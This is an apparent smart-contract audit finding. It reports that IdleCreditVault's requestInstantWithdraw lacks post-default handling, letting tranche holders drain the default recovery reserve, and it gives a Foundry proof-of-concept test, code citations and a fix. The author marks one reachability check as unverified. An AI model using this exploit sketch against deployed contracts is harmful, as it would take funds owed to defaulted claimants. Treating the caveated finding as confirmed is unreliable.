### Title
Post-default instant withdraw receipts are paid at par from the default recovery reserve - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`requestInstantWithdraw` lacks the post-default handling that `requestWithdraw` has. After `finalizeDefaultRecovery` crystallizes a fixed `defaultRecoveryReserve` sized only for pre-default claimants, a tranche holder can still open an instant-withdraw request. That receipt is then paid out 1:1 through `_transferFundedClaim` (or at `defaultRecoveryPrice` but against a basis never counted in `totalBasis`), draining recovery funds that belong to defaulted-epoch claimants — a classic use-after-free analog: new claims are served from a "freed"/finalized accounting structure that was closed at finalization.

### Finding Description
`requestWithdraw` explicitly branches on `defaultRecoveryFinalized`, forcing users to first claim old receipts and routing the new request into the haircut-priced `postDefaultRequests` bucket paid from the recovery reserve at a pre-discounted amount [1](#0-0) . `requestInstantWithdraw` performs no such branching: it burns the CDO's strategy tokens, mints a full `_amount` receipt to the user, and increases `instantWithdrawsRequests`, `instantWithdrawsRequestsByEpoch[user][currentEpoch]`, `instantWithdrawClaimsByEpoch[currentEpoch]` and `pendingInstantWithdraws` [2](#0-1) . Since `epochNumber` does not advance after default, `currentEpoch == defaultRecoveryEpoch`.

At finalization, `defaultRecoveryReserve`, `defaultRecoveryPrice` and `totalBasis` are fixed, and `instantWithdrawClaimsByEpoch[epochNumber]` was counted into `pendingBasis` only as it stood at that moment [3](#0-2) . Two payout paths then under-collateralize the new receipt:

- If `defaultInstantWithdrawsFinalized` is false (instant queue was fully funded at default), `claimInstantWithdrawRequest` skips `_claimDefaultedInstantWithdrawRequest` and pays the whole aggregate `instantWithdrawsRequests[_user]` at par via `_transferFundedClaim` [4](#0-3) . No funds were ever collected for this receipt (`collectInstantWithdrawFunds` is only invoked by the CDO during epochs), so the vault's held underlying — including `defaultRecoveryReserve` — subsidizes the payout.
- If `defaultInstantWithdrawsFinalized` is true, `_claimDefaultedInstantWithdrawRequest` pays `claimBasis * defaultRecoveryPrice / RECOVERY_FULL` and decrements `instantWithdrawClaimsByEpoch[defaultEpoch]` and `pendingInstantWithdraws` [5](#0-4) , but this claimBasis was never part of `totalBasis`, so the reserve is overdrawn and legitimate defaulted claimants are left unpaid.

The analogous guard for normal requests (revert if any open receipt exists, then use a haircut-priced bucket) is simply absent on the instant path.

### Impact Explanation
Direct theft / permanent loss for defaulted-epoch claimants. Every post-default instant request mints a receipt whose payout is drawn from `defaultRecoveryReserve` (or other strategy-held underlying) without a corresponding claim basis or funding step. An attacker holding tranche tokens converts them into immediate underlying at par (or at recovery price but unbudgeted), so when genuine defaulted claimants later call `claimWithdrawRequest`/`claimInstantWithdrawRequest`, the reserve is depleted and their claims underpay or revert on transfer. Loss is bounded by the reserve size and the attacker's tranche balance — quantifiably up to the full `defaultRecoveryReserve`.

### Likelihood Explanation
Requires a borrower default that reaches `finalizeDefaultRecovery`, after which any unprivileged tranche-token holder can act. Post-default `requestWithdraw` is intentionally still allowed (via `postDefaultRequests`), so the CDO-side request path remains callable after default; nothing in `requestInstantWithdraw` or `claimInstantWithdrawRequest` checks `defaultRecoveryFinalized` to block or haircut new instant receipts. Caveat I could not fully verify within the search budget: whether `IdleCDOEpochVariant.requestInstantWithdraw` itself reverts while `defaulted()` — if the CDO gates the call, the bug is unreachable and this finding is invalid; the strategy-level guard asymmetry strongly suggests it does not.

### Recommendation
Mirror the normal-request logic in `requestInstantWithdraw`: when `defaultRecoveryFinalized`, either revert outright or route the request through a haircut-priced bucket (burn/mint at the already-discounted amount and track in a post-default map) instead of incrementing `instantWithdrawsRequests`, `instantWithdrawClaimsByEpoch` and `pendingInstantWithdraws`. Alternatively, in `claimInstantWithdrawRequest`, only pay at par for receipts that were funded before finalization and pay post-finalization receipts strictly from newly funded amounts.

### Proof of Concept
Foundry fork sketch against the existing harness in `test/foundry/IdleCreditVault.t.sol`:

```solidity
function testPostDefaultInstantWithdrawDrainsRecovery() external {
    // setup: deposits, startEpoch(0), borrower repays nothing -> default
    uint256 amount = 10_000 * ONE_SCALE;
    uint256 mintedAA = idleCDO.depositAA(amount);          // attacker LP
    _depositWithUser(victim, amount, true);              // honest LP with pending receipt

    vm.prank(victim);
    cdoEpoch.requestInstantWithdraw(IERC20(AAtranche).balanceOf(victim), address(AAtranche));

    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, 0);    // borrower returns nothing
    _checkDefault();

    // finalize at 70% recovery
    uint256 basis = cdoEpoch.getContractValue() + creditVault.defaultPendingClaimBasis();
    uint256 recovered = basis * 7e17 / ONE_TRANCHE;
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    // attacker (still holds tranches) opens + claims an instant request post-default
    uint256 balPre = underlying.balanceOf(address(this));
    cdoEpoch.requestInstantWithdraw(mintedAA, address(AAtranche));
    cdoEpoch.claimInstantWithdrawRequest();
    uint256 attackerGain = underlying.balanceOf(address(this)) - balPre;
    assertGt(attackerGain, 0);

    // honest victim's haircutted claim now underpays/reverts: reserve drained
    uint256 reserveBefore = creditVault.defaultRecoveryReserve();
    vm.prank(victim);
    cdoEpoch.claimInstantWithdrawRequest(); // pays less than basis*price or reverts
    assertLt(creditVault.defaultRecoveryReserve(), reserveBefore - recovered * 7e17 / ONE_TRANCHE);
}
```

If `defaultInstantWithdrawsFinalized` was false at finalization, the attacker is paid at full par; if true, paid at `defaultRecoveryPrice` but against a `claimBasis` never included in `totalBasis`. Either way `defaultRecoveryReserve` is overdrawn and later legitimate claims are impaired.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L247-257)
```text
    if (defaultRecoveryFinalized) {
      // user should first claim old already-funded withdraw requests before requesting new ones after default
      if (_hasWithdrawRequest(_user) || instantWithdrawsRequests[_user] != 0 || postDefaultRequests[_user] != 0) {
        revert NotAllowed();
      }
      // Preserve request/claim UX after default without increasing borrower-facing pendingWithdraws.
      // The CDO passes an already-haircut amount because finalization lowered virtualPrice first.
      _burn(msg.sender, _amount);
      _mint(_user, _amount);
      postDefaultRequests[_user] = _amount;
      return;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L360-375)
```text
    _burn(msg.sender, _amount);
  
    // mint equal amount of strategy tokens to the user as receipt, useful in case of default
    _mint(_user, _amount);

    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L380-392)
```text
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L679-696)
```text
    uint256 pendingBasis = defaultPendingClaimBasis();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (totalBasis == 0) revert NotAllowed();

    // Some recovery funds may already be in this strategy: partially prefunded instant requests
    // and borrower-send funds that failed at epoch start. Count both without pulling them again.
    uint256 prefundedReserve = _defaultPrefundedInstantReserve();
    uint256 reserveAmount = _recoveredAmount + prefundedReserve + defaultRecoveryReserve;
    // Recovery can be above par if the recovered funds exceed the computed basis.
    uint256 recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis;

    defaultRecoveryFinalized = true;
    defaultRecoveryReserve = reserveAmount;
    defaultRecoveryPrice = recoveryPrice;
    defaultRecoveryEpoch = epochNumber;
    // A non-zero pending instant bucket means current-epoch instant receipts were not fully funded
    // and must be paid through the same recovery ratio as normal pending receipts.
    defaultInstantWithdrawsFinalized = pendingInstantWithdraws != 0;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L842-855)
```text
  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
```
